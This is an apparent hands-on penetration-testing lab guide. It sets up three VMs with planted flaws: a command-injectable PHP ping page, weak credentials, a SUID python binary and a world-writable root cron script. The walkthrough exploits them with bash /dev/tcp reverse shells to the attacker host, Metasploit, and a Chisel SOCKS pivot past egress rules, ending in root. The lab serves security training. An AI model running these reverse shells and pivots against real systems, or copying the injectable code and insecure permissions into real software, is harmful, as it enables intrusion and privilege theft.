# Lab 3: SSH Tunnels, Chisel, and Metasploit

## Objective

Exploit a web application vulnerability (command injection), pivot through multiple networks using SSH tunnels and Chisel, bypass egress firewall rules, and use Metasploit through tunnels to exploit an internal target. Escalate privileges to capture the flag.

## Skills Practiced

- nmap and nc reconnaissance
- Command injection exploitation (OWASP Top 10)
- Metasploit handler catching reverse shells
- SSH local port forwarding
- SSH dynamic port forwarding (SOCKS proxy)
- Reverse SSH tunnel (blocked by egress filter)
- Chisel SOCKS proxy to bypass egress filtering
- proxychains for routing tools through tunnels
- Metasploit through tunnels
- Privilege escalation (SUID binary + writable cron)

## Prerequisites

- CentOS and Ubuntu need second NICs on the same Host-only VMnet for 172.16.0.0/24
- Chisel installed on Kali: `sudo apt install chisel -y`
- Copy chisel to a serving directory: `mkdir ~/tools && cp $(which chisel) ~/tools/`

## Network Diagram

```
ATTACKER                         DMZ NETWORK                    INTERNAL NETWORK

Kali                      Debian (web app server)         CentOS (middleware)
192.168.244.129           192.168.244.132                 192.168.244.131
                                                          172.16.0.1
                                                               │
                                                          Ubuntu (target)
                                                          172.16.0.2
```

**Goal:** Get root on Ubuntu and read `/root/flag.txt`.

---

## Setup

### Debian (web app server — 192.168.244.132)

```bash
sudo apt update
sudo apt install apache2 openssh-server php libapache2-mod-php vsftpd -y

sudo systemctl enable --now apache2
sudo systemctl enable --now ssh
sudo systemctl enable --now vsftpd

# Create devops user with weak credentials
sudo useradd -m -s /bin/bash devops
echo "devops:password123" | sudo chpasswd

# Main web page with hidden directory hint
cat << 'EOF' | sudo tee /var/www/html/index.html
<h1>DevOps Dashboard</h1>
<p>Internal tools portal</p>
<!-- Debug: admin panel moved to /admin -->
<!-- Note: FTP has maintenance docs -->
EOF

# Admin page with middleware credentials
sudo mkdir -p /var/www/html/admin
cat << 'EOF' | sudo tee /var/www/html/admin/index.html
<h1>Admin Panel</h1>
<h2>Server Inventory</h2>
<p>Middleware: 192.168.244.131 (SSH: middleware / M1ddl3w@r3!)</p>
<p>Internal dev server: 172.16.0.2 (only reachable from middleware)</p>
<p>Middleware has dual-homed interfaces: DMZ + internal (172.16.0.0/24)</p>
EOF

# Vulnerable PHP page (command injection)
cat << 'PHPEOF' | sudo tee /var/www/html/admin/ping.php
<h1>Network Diagnostic Tool</h1>
<form method="GET">
  <label>Enter IP to ping:</label>
  <input type="text" name="ip">
  <button type="submit">Ping</button>
</form>
<?php
if(isset($_GET['ip'])) {
    $ip = $_GET['ip'];
    echo "<pre>";
    system("ping -c 2 " . $ip);
    echo "</pre>";
}
?>
PHPEOF

# FTP anonymous access with hints
sudo sed -i 's/anonymous_enable=NO/anonymous_enable=YES/' /etc/vsftpd.conf 2>/dev/null
echo "anonymous_enable=YES" | sudo tee -a /etc/vsftpd.conf
sudo systemctl restart vsftpd

echo "=== Maintenance Notes ===" | sudo tee /srv/ftp/maintenance.txt
echo "Web admin panel: /admin" | sudo tee -a /srv/ftp/maintenance.txt
echo "Diagnostic tool: /admin/ping.php" | sudo tee -a /srv/ftp/maintenance.txt
echo "SSH is available for devops team" | sudo tee -a /srv/ftp/maintenance.txt

# devops user has tunnel reference notes
sudo mkdir -p /home/devops/notes
echo "=== SSH Tunnel Reference ===" | sudo tee /home/devops/notes/tunnels.txt
echo "To reach internal network from here:" | sudo tee -a /home/devops/notes/tunnels.txt
echo "ssh -L 2222:172.16.0.2:22 middleware@192.168.244.131" | sudo tee -a /home/devops/notes/tunnels.txt
echo "Then: ssh devuser@localhost -p 2222" | sudo tee -a /home/devops/notes/tunnels.txt
echo "" | sudo tee -a /home/devops/notes/tunnels.txt
echo "Dev server credentials: devuser / D3v@cc3ss!" | sudo tee -a /home/devops/notes/tunnels.txt
sudo chown -R devops:devops /home/devops/notes

# Open firewall
sudo iptables -F
sudo iptables -P INPUT ACCEPT
sudo iptables -P FORWARD ACCEPT
sudo iptables -P OUTPUT ACCEPT
```

### CentOS (middleware — 192.168.244.131 + 172.16.0.1)

```bash
sudo systemctl stop firewalld
sudo systemctl disable firewalld
sudo dnf install iptables-services python3 -y

sudo systemctl enable --now sshd

# Create middleware user
sudo useradd -m -s /bin/bash middleware
echo "middleware:M1ddl3w@r3!" | sudo chpasswd
sudo usermod -aG wheel middleware

# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1
echo "net.ipv4.ip_forward = 1" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p

# Internal web app on port 8080
sudo mkdir -p /opt/webapp/config
echo "<h1>Internal Application Server</h1>" | sudo tee /opt/webapp/index.html
echo "<p>Config backup: /opt/webapp/config/</p>" | sudo tee -a /opt/webapp/index.html

echo "DB_HOST=172.16.0.2" | sudo tee /opt/webapp/config/database.conf
echo "DB_PORT=3306" | sudo tee -a /opt/webapp/config/database.conf
echo "DB_USER=root" | sudo tee -a /opt/webapp/config/database.conf
echo "DB_PASS=r00tD@t@b@se!" | sudo tee -a /opt/webapp/config/database.conf

cat << 'EOF' | sudo tee /opt/webapp/app.py
from http.server import HTTPServer, SimpleHTTPRequestHandler
import os
os.chdir('/opt/webapp')
HTTPServer(('0.0.0.0', 8080), SimpleHTTPRequestHandler).serve_forever()
EOF

nohup python3 /opt/webapp/app.py &>/dev/null &

# SSH tunnel reference in user home
sudo mkdir -p /home/middleware/scripts
echo "#!/bin/bash" | sudo tee /home/middleware/scripts/backup_internal.sh
echo "scp devuser@172.16.0.2:/home/devuser/projects/* /home/middleware/backups/" | sudo tee -a /home/middleware/scripts/backup_internal.sh
sudo chown -R middleware:middleware /home/middleware/scripts

# Allow SSH forwarding
sudo sed -i 's/#AllowTcpForwarding yes/AllowTcpForwarding yes/' /etc/ssh/sshd_config
sudo sed -i 's/#GatewayPorts no/GatewayPorts yes/' /etc/ssh/sshd_config
sudo systemctl restart sshd

# === IPTABLES ===
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -p icmp -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 8080 -s 192.168.244.0/24 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 8080 -s 172.16.0.0/24 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 8888 -j ACCEPT
sudo iptables -A INPUT -j LOG --log-prefix "MW-DROPPED-IN: " --log-level 4
sudo iptables -P INPUT DROP

# Block reverse SSH AND port 4444 to Kali
sudo iptables -A OUTPUT -p tcp --dport 22 -d 192.168.244.129 -j LOG --log-prefix "MW-BLOCKED-SSH: " --log-level 4
sudo iptables -A OUTPUT -p tcp --dport 22 -d 192.168.244.129 -j DROP
sudo iptables -A OUTPUT -p tcp --dport 4444 -d 192.168.244.129 -j LOG --log-prefix "MW-BLOCKED-4444: " --log-level 4
sudo iptables -A OUTPUT -p tcp --dport 4444 -d 192.168.244.129 -j DROP
sudo iptables -P OUTPUT ACCEPT

# FORWARD between subnets
sudo iptables -A FORWARD -s 192.168.244.0/24 -d 172.16.0.0/24 -j ACCEPT
sudo iptables -A FORWARD -s 172.16.0.0/24 -d 192.168.244.0/24 -j ACCEPT
sudo iptables -A FORWARD -j LOG --log-prefix "MW-DROPPED-FWD: " --log-level 4
sudo iptables -P FORWARD DROP

# NAT (replace ens224 with your interface name)
sudo iptables -t nat -A POSTROUTING -s 192.168.244.0/24 -o ens224 -j MASQUERADE

sudo service iptables save
```

### Ubuntu (target — 172.16.0.2)

```bash
sudo apt update
sudo apt install openssh-server apache2 php libapache2-mod-php -y

sudo systemctl enable --now ssh
sudo systemctl enable --now apache2

# Create devuser
sudo useradd -m -s /bin/bash devuser
echo "devuser:D3v@cc3ss!" | sudo chpasswd

# Web server with sensitive content
echo "<h1>Internal Dev Server</h1><p>Project Status Dashboard</p>" | sudo tee /var/www/html/index.html

sudo mkdir -p /var/www/html/projects
echo "<h1>Project Files</h1><p>API keys in /home/devuser/.api_keys</p>" | sudo tee /var/www/html/projects/index.html

sudo mkdir -p /home/devuser/.api_keys
echo "AWS_KEY=AKIAIOSFODNN7EXAMPLE" | sudo tee /home/devuser/.api_keys/aws.txt
echo "AWS_SECRET=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" | sudo tee -a /home/devuser/.api_keys/aws.txt
sudo chown -R devuser:devuser /home/devuser

# Create project files
sudo mkdir -p /home/devuser/projects
echo "Project Alpha — internal API server" | sudo tee /home/devuser/projects/readme.txt
echo "Database credentials in /opt/config" | sudo tee -a /home/devuser/projects/readme.txt
sudo chown -R devuser:devuser /home/devuser/projects

sudo mkdir -p /opt/config
echo "DB_HOST=localhost" | sudo tee /opt/config/db.conf
echo "DB_USER=root" | sudo tee -a /opt/config/db.conf
echo "DB_PASS=r00tdb2026!" | sudo tee -a /opt/config/db.conf
sudo chmod 644 /opt/config/db.conf

# Create the flag
echo "FLAG{chisel_metasploit_tunnel_master_2026}" | sudo tee /root/flag.txt
sudo chmod 600 /root/flag.txt

# SUID python for privesc
sudo cp /usr/bin/python3 /usr/local/bin/python3_debug
sudo chmod u+s /usr/local/bin/python3_debug

# Writable cron script (alternative privesc path)
sudo mkdir -p /opt/scripts
echo '#!/bin/bash' | sudo tee /opt/scripts/cleanup.sh
echo 'find /tmp -type f -mtime +7 -delete' | sudo tee -a /opt/scripts/cleanup.sh
sudo chmod 777 /opt/scripts/cleanup.sh
echo "* * * * * root /opt/scripts/cleanup.sh" | sudo tee /etc/cron.d/cleanup

# === IPTABLES — only allow from internal network ===
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -p icmp -s 172.16.0.0/24 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -s 172.16.0.0/24 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -s 172.16.0.0/24 -j ACCEPT
sudo iptables -A INPUT -s 192.168.244.0/24 -j LOG --log-prefix "DEV-BLOCKED-DMZ: " --log-level 4
sudo iptables -A INPUT -s 192.168.244.0/24 -j DROP
sudo iptables -A INPUT -j LOG --log-prefix "DEV-DROPPED: " --log-level 4
sudo iptables -P INPUT DROP
sudo iptables -P OUTPUT ACCEPT
```

---

## Attack Walkthrough

### Phase 1: Reconnaissance

```bash
# Discover hosts
nmap -sn 192.168.244.0/24

# Scan Debian
nmap -sV -sC 192.168.244.132 -oN debian_scan.txt

# Scan CentOS
nmap -sV -sC 192.168.244.131 -oN centos_scan.txt

# Banner grab with nc
nc -vn 192.168.244.132 22
nc -vn 192.168.244.132 80
nc -vn 192.168.244.131 22
```

### Phase 2: Enumerate Debian

```bash
# Check FTP
ftp 192.168.244.132
# anonymous / (blank)
ftp> get maintenance.txt
ftp> bye
cat maintenance.txt

# Check web server
curl -s 192.168.244.132 | grep "<!--"
# Reveals /admin

curl 192.168.244.132/admin/
# Reveals middleware creds and internal network info

curl 192.168.244.132/admin/ping.php
# Diagnostic tool — potential command injection
```

### Phase 3: Exploit Command Injection

```bash
# Test command injection
curl "http://192.168.244.132/admin/ping.php?ip=127.0.0.1;whoami"
# Returns "www-data" — confirmed

# Enumerate through the injection
curl "http://192.168.244.132/admin/ping.php?ip=127.0.0.1;ls%20/home"
curl "http://192.168.244.132/admin/ping.php?ip=127.0.0.1;cat%20/home/devops/notes/tunnels.txt"
# Find devuser credentials and SSH tunnel instructions
```

### Phase 4: Get a Shell with Metasploit

```bash
# Start Metasploit
sudo systemctl start postgresql
msfconsole

# Set up handler
msf6> use exploit/multi/handler
msf6> set PAYLOAD linux/x64/shell_reverse_tcp
msf6> set LHOST 192.168.244.129
msf6> set LPORT 5555
msf6> run -j
```

Trigger the reverse shell (new Kali terminal):

```bash
curl "http://192.168.244.132/admin/ping.php?ip=127.0.0.1;bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/192.168.244.129/5555%200>%261'"
```

```bash
# In msfconsole
msf6> sessions
msf6> sessions -i 1

# Upgrade the shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Phase 5: Lateral Movement to CentOS

```bash
# From Debian shell
ssh middleware@192.168.244.131
# Password: M1ddl3w@r3!

# Enumerate
ip a                                    # See both interfaces
cat /home/middleware/scripts/backup_internal.sh   # Confirms devuser@172.16.0.2
nc -zvn 172.16.0.2 22                   # Reachable from CentOS
nc -zvn 172.16.0.2 80                   # Web server too
```

### Phase 6: Try Reverse SSH Tunnel — Fails

```bash
# From CentOS
ssh -R 9050 kali_user@192.168.244.129
# FAILS — blocked

sudo grep "MW-BLOCKED" /var/log/messages
# Shows the egress block
```

### Phase 7: Bypass with Chisel

On Kali (terminal 1):

```bash
chisel server --reverse --port 8888
```

On Kali (terminal 2) — serve Chisel binary:

```bash
cd ~/tools
python3 -m http.server 9090
```

From Debian shell — transfer Chisel to CentOS:

```bash
curl http://192.168.244.129:9090/chisel -o /tmp/chisel
chmod +x /tmp/chisel
scp /tmp/chisel middleware@192.168.244.131:/tmp/chisel
```

On CentOS:

```bash
/tmp/chisel client 192.168.244.129:8888 R:socks
```

Configure proxychains on Kali:

```bash
sudo nano /etc/proxychains4.conf
# Change last line to: socks5 127.0.0.1 1080
```

Scan internal network through the tunnel:

```bash
proxychains nmap -sT -Pn -sV 172.16.0.2 -p 22,80
proxychains nc -vn 172.16.0.2 22
proxychains curl http://172.16.0.2
```

### Phase 8: Metasploit through Chisel

```bash
msf6> use auxiliary/scanner/ssh/ssh_version
msf6> set RHOSTS 172.16.0.2
msf6> set Proxies socks5:127.0.0.1:1080
msf6> run

msf6> use auxiliary/scanner/http/http_version
msf6> set RHOSTS 172.16.0.2
msf6> set Proxies socks5:127.0.0.1:1080
msf6> run

msf6> hosts
msf6> services
```

### Phase 9: Access Ubuntu and Escalate

```bash
# From CentOS — SSH to Ubuntu
ssh devuser@172.16.0.2
# Password: D3v@cc3ss!

# Enumerate
cat /home/devuser/projects/readme.txt
cat /opt/config/db.conf

# Find privesc vector
find / -perm -4000 -type f 2>/dev/null
# /usr/local/bin/python3_debug — SUID python

# Escalate
/usr/local/bin/python3_debug -c 'import os; os.setuid(0); os.system("/bin/bash")'

whoami
# root

cat /root/flag.txt
# FLAG{chisel_metasploit_tunnel_master_2026}
```

#### Alternative: writable cron privesc

```bash
ls -la /opt/scripts/cleanup.sh
# -rwxrwxrwx — world writable

cat /etc/cron.d/cleanup
# * * * * * root /opt/scripts/cleanup.sh — runs every minute as root

# Inject reverse shell
echo "bash -i >& /dev/tcp/192.168.244.129/6666 0>&1" >> /opt/scripts/cleanup.sh

# On Kali — catch the root shell
nc -lvnp 6666
# Wait up to 60 seconds
```

---

## Tunnel Types Used

| Type | Command | Purpose |
|---|---|---|
| Local forward | `ssh -L 8080:target:80 user@pivot` | Reach CentOS web app from Kali |
| Dynamic forward | `ssh -D 9050 user@pivot` | SOCKS proxy for broad scanning |
| Reverse tunnel | `ssh -R 9050 user@kali` | Attempted — blocked by egress filter |
| Chisel reverse | `chisel client kali:8888 R:socks` | Bypassed egress filter over HTTP |
| proxychains | `proxychains nmap ...` | Route tools through any SOCKS proxy |

## Attack Chain Summary

```
Phase 1: Recon          → nmap + nc find FTP, SSH, HTTP on Debian
Phase 2: Enumerate      → FTP hint → /admin → credentials + command injection
Phase 3: Exploit        → Command injection → reverse shell to Metasploit
Phase 4: Metasploit     → Handler catches shell, upgrade to interactive
Phase 5: Lateral Move   → SSH to CentOS with found creds
Phase 6: Tunnel Blocked → Reverse SSH fails (egress iptables)
Phase 7: Chisel Bypass  → SOCKS proxy over HTTP bypasses egress filter
Phase 8: Metasploit     → Scan internal services through Chisel tunnel
Phase 9: Priv Esc       → SUID python3_debug → root → flag
```

## Cleanup

```bash
# Debian
sudo userdel -r devops && sudo rm -rf /var/www/html/admin
sudo iptables -F && sudo iptables -P INPUT ACCEPT

# CentOS
sudo userdel -r middleware && sudo kill $(pgrep -f app.py) 2>/dev/null
sudo rm -rf /opt/webapp
sudo iptables -F && sudo iptables -t nat -F
sudo iptables -P INPUT ACCEPT && sudo iptables -P FORWARD ACCEPT && sudo iptables -P OUTPUT ACCEPT

# Ubuntu
sudo userdel -r devuser
sudo rm -f /usr/local/bin/python3_debug /root/flag.txt /opt/scripts/cleanup.sh /etc/cron.d/cleanup
sudo iptables -F && sudo iptables -P INPUT ACCEPT
```
